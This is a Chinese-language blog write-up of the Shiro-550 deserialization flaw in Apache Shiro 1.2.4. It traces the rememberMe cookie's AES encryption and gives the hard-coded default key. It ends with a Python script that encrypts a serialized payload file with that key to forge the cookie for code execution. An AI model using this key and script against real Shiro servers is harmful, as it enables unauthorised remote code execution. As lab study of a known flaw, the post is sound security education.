---
title: Java反序列化Shiro篇01-Shiro550
date: 2025-10-3 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 环境搭建

- jdk8u65

- [Tomcat8.5.81下载](https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/)

- shiro 1.2.4

**漏洞影响版本：Shiro <= 1.2.4**

P神的项目:[JavaThings/shirodemo at master · phith0n/JavaThings](https://github.com/phith0n/JavaThings/tree/master/shirodemo)

## IDEA配置

打开这个项目然后去配置

![image-20251003152451810](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003152451810.png)

默认访问的是http://localhost:8080/，地址要和这里配置的URL要相同，要不然就会404

![image-20251003154413341](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003154413341.png)

## 运行测试

运行`login.jsp`，默认的路径是http://localhost:8080/，需要修改为`http://本地ip/shirodemo_war/login.jsp`，

**需要注意的几个点：**

1. URL路径要和配置中相同
2. 将localhost改为本地ip是为了bp抓到包
3. bp和proxy插件都需要修改为监听本地ip才可以抓到包
4. bp默认的8080监听端口被上面我们运行的服务占用了，所以要换个端口

#  Shiro-550 分析

**账号密码为`root:secret`**

## 漏洞原理

勾选 `RememberMe` 字段，登陆成功的话，返回包 `set-Cookie` 会有 `rememberMe=deleteMe` 字段，还会有 `rememberMe` 字段，之后的所有请求中 `Cookie` 都会有 `rememberMe` 字段，那么就可以利用这个 `rememberMe` 进行反序列化，从而 `getshell`。

![image-20251003162822079](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003162822079.png)

Shiro1.2.4 及之前的版本中，AES 加密的密钥默认**硬编码**在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。

## 分析加密过程

输入账号密码并且勾选remember登录时，在`onSuccessfulLogin`方法开头断点

先清楚之前的`rememberme`字段，if这里会判断token中是否存在`rememberme`字段

![image-20251003170657990](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003170657990.png)

如果存在，进入到`rememberIdentity`，`getIdentityToRemeber`从认证信息里提取需要记住的身份信息，返回的是一个`PrincipalCollection`，这是一个`Shiro`用来统一存储用户身份的集合

![image-20251003171247458](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003171247458.png)

然后继续跟进`this.rememberIdentity()`，`convertPrincipalsToBytes`将`principals`序列化，并且检查有没有加密服务，有的话再调用`encrypt`将数组加密

![image-20251003172005916](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003172005916.png)

进入到`encrypt`函数查看加密过程，`CipherService`实例化了一个`AES`加密，加密的第一个参数是需要加密的值，第二个参数是加密的`key`值，key值是通过`getEncryptionCipherKey`调用，去看看key值是什么

![image-20251003181117613](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003181117613.png)

![image-20251003172759874](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003172759874.png)

`getEncryptionCipherKey`获取到一个私有属性的`encryptionCipherKey`值，但是该值为空，找一下`encryptionCipherKey`这个值是怎么设置的

![image-20251003173521583](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003173521583.png)

通过一步一步跟进`setCipherKey`，得到key值是个固定的值

![image-20251003173612782](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003173612782.png)

先序列化然后加密，加密的秘钥也有了，然后去看解密

## 解密分析过程

这个函数先检查是否是HTTP请求，然后检查是否标记了'身份已被移除'，然后cookie中读取出`base64`编码的信息，检查是否是`deleteMe`，否则将base64解码

![image-20251003175540811](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003175540811.png)

![image-20251003174639521](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003174639521.png)

向上去找，检查谁调用了`getRememberedSerializedIdentity`，当前类下没有，去找他的父类，父类`AbstractRememberMemanger`的`getRememberedPrincipals`方法调用了当前类下的`getRememberedSerializedIdentity`，但是父类的`getRememberedSerializedIdentity`是抽象方法，子类对该方法进行了重写，所以调用的就是子类的`getRememberedSerializedIdentity`方法

上面那个函数将`base64`解码后的`rememberme`值进行返回，这里保存在了bytes中，bytes不为空且长度大于0就会执行`convertBytesToPrincipals`函数

![image-20251003175627809](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003175627809.png)

`convertBytesToPrincipals`中先进行解密，然后反序列化，

![image-20251003180024979](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003180024979.png)

解密函数和上面的加密函数的步骤是一样的，代码都大致一样，只有加解密函数不同，也是AES解密，然后跟进`getDecryptionCipherKey`函数

![image-20251003181257713](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003181257713.png)

![image-20251003180448312](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003180448312.png)

同样的获取和设置`key`值的方法，key值相同

![image-20251003180755459](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003180755459.png)

![image-20251003180809573](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550/image-20251003180809573.png)

# 漏洞利用

上面已经分析过`rememberme`的加密方式了，所以利用方式就是构造攻击链，序列化之后使用AES加密，替换`rememberme`的值，就可以做到任意代码执行

将序列化后的值输出到`urldns.ser`中，然后进行加密后替换

加密脚本

>  pip3 install pycryptodome

```python
# －*-* coding:utf-8
# @Time    :  2022/7/13 17:36
# @Author  : Drunkbaby
# @FileName: poc.py
# @Software: VSCode
# @Blog    ：https://drun1baby.github.io/

from email.mime import base
from pydoc import plain
import sys
import base64
from turtle import mode
import uuid
from random import Random
from Cryptodome.Cipher import AES


def get_file_data(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    return data


def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext


def aes_dec(enc_data):
    enc_data = base64.b64decode(enc_data)
    unpad = lambda s: s[:-s[-1]]
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = enc_data[:16]
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    plaintext = encryptor.decrypt(enc_data[16:])
    plaintext = unpad(plaintext)
    return plaintext


if __name__ == "__main__":
    data = get_file_data("urldns.ser")
    print(aes_enc(data))

```

